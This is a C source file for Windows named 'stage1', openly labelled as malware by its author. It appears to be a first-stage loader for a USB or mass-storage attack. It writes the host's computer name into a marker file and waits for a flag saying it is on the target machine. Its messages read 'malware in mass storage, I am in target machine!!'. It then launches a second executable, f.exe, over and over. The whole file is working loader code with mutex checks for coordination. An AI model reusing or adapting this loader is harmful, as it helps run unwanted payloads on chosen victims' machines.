/*
** MIT LICENSE
** Copyright <2020> <David Reguera Garcia aka Dreg> dreg@fr33project.org
** http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg
**
** Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
** associated documentation files (the "Software"), to deal in the Software without restriction,
** including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
** and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
** subject to the following conditions:
**
** The above copyright notice and this permission notice shall be included in all copies or substantial
** portions of the Software.
**
** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
** LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
** IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
** WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
** SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h> 

char curr_dir[MAX_PATH];
char cmdex[MAX_PATH * 2];


char shex[MAX_PATH * 2];

DWORD WINAPI execf(LPVOID lpParameter)
{
	ShellExecuteA(NULL, "open", shex, NULL, curr_dir, SW_SHOWNORMAL);

	return 0;
}

int main(int argc, char* argv[])
{
	FILE* file = NULL;
	int retf = 1;

	puts("\n-\n"
		"stage1 (MIT LICENSE) by David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
		"http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg\n"
		"syntax: stage1.exe\n"
		"examples: stage1.exe\n"
		"-\n");

	HANDLE hMutexHandle = CreateMutexW(NULL, FALSE, L"drgmlwsf");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return 1;
	}

	HANDLE openned_mutex = NULL;

	openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, L"roaptsdrgmlw");
	if (NULL != openned_mutex)
	{
		CloseHandle(openned_mutex);
		return 1;
	}

	GetCurrentDirectoryA(MAX_PATH, curr_dir);

	sprintf(cmdex, "%s\\g", curr_dir);
	sprintf(shex, "%s\\f.exe", curr_dir);

	puts(cmdex);
	puts(shex);

	do
	{
		puts("trying to start FIRST STAGE....");
		file = fopen(cmdex, "rb+");
		if (NULL != file)
		{
	#define MAX_SIZE_CMPNAME 1000
			DWORD size_computer_name = MAX_SIZE_CMPNAME;
			static char computer_name[MAX_SIZE_CMPNAME + 1];

			if (GetComputerNameA(computer_name, &size_computer_name))
			{
				puts(computer_name);

				fseek(file, 0L, SEEK_SET);
				fwrite(computer_name, strlen(computer_name), 1, file);
			}

			fflush(file);
			fclose(file);

			FILE* hfile = NULL;
			char rd_bff[3] = { 0 };
			do
			{
				puts("checking if i am in target machine...");
				Sleep(5000);
				hfile = fopen(cmdex, "rb");
				if (NULL != hfile)
				{
					fread(rd_bff, 2, 1, hfile);
					fclose(hfile);
					if (rd_bff[0] == 1 && rd_bff[1] == 1)
					{
						puts("\n malware in mass storage, I am in target machine!!");
						do
						{
							printf("trying execute: %s\n", shex);
							Sleep(3000);
							CloseHandle(CreateThread(NULL, 0, execf, NULL, 0, NULL));
						
							openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, L"roaptsdrgmlw");
							if (NULL != openned_mutex)
							{
								CloseHandle(openned_mutex);
								retf = 0;
								goto endfc;
							}

						} while (1);
					}
					else
					{
						Sleep(3000);
					}
				}
				else
				{
					perror(cmdex);
				}

				openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, L"roaptsdrgmlw");
				if (NULL != openned_mutex)
				{
					CloseHandle(openned_mutex);
					retf = 1;
					goto endfc;
				}
			} while (1);
		}
		else
		{
			perror(cmdex);
			Sleep(3000);
		}

		openned_mutex = OpenMutexW(SYNCHRONIZE, FALSE, L"roaptsdrgmlw");
		if (NULL != openned_mutex)
		{
			CloseHandle(openned_mutex);
			retf = 1;
			goto endfc;
		}
	} while (1);


endfc:

	if (retf == 0)
	{
		puts("\nsuccess!\n");
	}
	else
	{
		puts("\nsome error!\n");
	}

	puts("\nclosing in 5 secs...");
	Sleep(5000);

	return retf;
}